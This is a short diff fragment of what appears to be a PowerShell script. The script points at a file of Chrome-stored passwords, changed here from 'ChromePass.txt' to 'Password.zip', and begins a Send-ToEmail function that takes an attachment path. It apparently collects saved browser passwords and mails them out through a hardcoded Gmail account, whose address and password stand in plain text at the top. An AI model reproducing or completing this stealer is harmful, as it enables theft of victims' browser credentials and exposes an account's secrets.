@@ -1,6 +1,6 @@
 $Username = "aaa290898@gmail.com";
 $Password= "aaaaaa290898";
-$path= "C:\chrome\ChromePass.txt"
+$path= "C:\chrome\Password.zip"
 
 
 function Send-ToEmail([string]$email, [string]$attachmentpath){
